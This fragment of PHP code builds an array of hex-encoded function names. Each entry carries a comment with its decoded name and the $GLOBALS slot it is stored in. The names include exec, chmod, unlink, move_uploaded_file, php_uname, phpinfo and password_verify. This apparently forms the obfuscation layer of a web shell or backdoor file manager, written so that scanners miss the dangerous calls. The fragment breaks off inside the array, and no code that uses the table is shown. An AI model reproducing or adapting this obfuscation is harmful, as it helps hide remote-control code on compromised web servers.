...
function startEncodeFunction () {
	...
	$encFunct = [
		...
		"667772697465", // fwrite $GLOBALS[0]
		"66636C6F7365", // fclose $GLOBALS[1]
		"66696C6573697A65", // filesize $GLOBALS[2]
		"6672656164", // fread $GLOBALS[3]
		"666F70656E", // fopen $GLOBALS[4]
		"68746D6C7370656369616C6368617273", // htmlspecialchars $GLOBALS[5]
		"66696C657065726D73", // fileperms $GLOBALS[6]
		"636C656172737461746361636865", // clearstatchache $GLOBALS[7]
		"63686D6F64", // chmod $GLOBALS[8]
		"7374725F636F6E7461696E73", // str_contains $GLOBALS[9]
		"66696C655F657869737473", // file_exists $GLOBALS[10]
		"6D6B646972", // mkdir $GLOBALS[11]
		"6D6F76655F75706C6F616465645F66696C65", // move_uploaded_file $GLOBALS[12]
		"726D646972", // rmdir $GLOBALS[13]
		"676C6F62", // glob $GLOBALS[14]
		"737562737472", // substr $GLOBALS[15]
		"69735F646972", // is_dir $GLOBALS[16]
		"69735F66696C65", // is_file $GLOBALS[17]
		"756E6C696E6B", // unlink $GLOBALS[18]
		"72656E616D65", // rename $GLOBALS[19]
		"7374725F7265706C616365", // str_replace $GLOBALS[20]
		"6469726E616D65", // dirname $GLOBALS[21]
		"69735F7265616461626C65", // is_readable $GLOBALS[22]
		"626173656E616D65", // basename $GLOBALS[23]
		"69735F777269746561626C65", // is_writeable $GLOBALS[24]
		"64617465", // date $GLOBALS[25]
		"66696C656D74696D65", // filemtime $GLOBALS[26]
		"7265616C70617468", // realpath $GLOBALS[27]
		"61727261795F64696666", // array_diff $GLOBALS[28]
		"61727261795F6D65726765", // array_merge $GLOBALS[29]
		"7363616E646972", // scandir $GLOBALS[30]
		"70687076657273696F6E", // phpversion $GLOBALS[31]
		"7068705F756E616D65", // php_uname $GLOBALS[32]
		"676574637764", // getcwd $GLOBALS[33]
		"65786563", // exec $GLOBALS[34]
		"6368646972", // chdir $GLOBALS[35]
		"707265675F6D61746368", // preg_match $GLOBALS[36]
		"737072696E7466", // sprintf $GLOBALS[37]
		"636F756E74", // count $GLOBALS[38]
		"61727261795F72657665727365", // array_reverse $GLOBALS[39]
		"61727261795F70757368", // array_push $GLOBALS[40]
		"696E5F6172726179", // in_array $GLOBALS[41]
		"6469736B5F746F74616C5F7370616365", // disk_total_space $GLOBALS[42]
		"6469736B5F667265655F7370616365", // disk_free_space $GLOBALS[43]
		"6261736536345F656E636F6465", // base64_encode $GLOBALS[44]
		"736574636F6F6B6965", // setcookie $GLOBALS[45]
		"70617373776F72645F766572696679", // password_verify $GLOBALS[46]
		"6261736536345F6465636F6465", // base64_decode $GLOBALS[47]
		"706870696E666F", // phpinfo $GLOBALS[48]
		"676574686F737462796E616D65", // gethostbyname $GLOBALS[49]
		"686561646572" // header $GLOBALS[50]
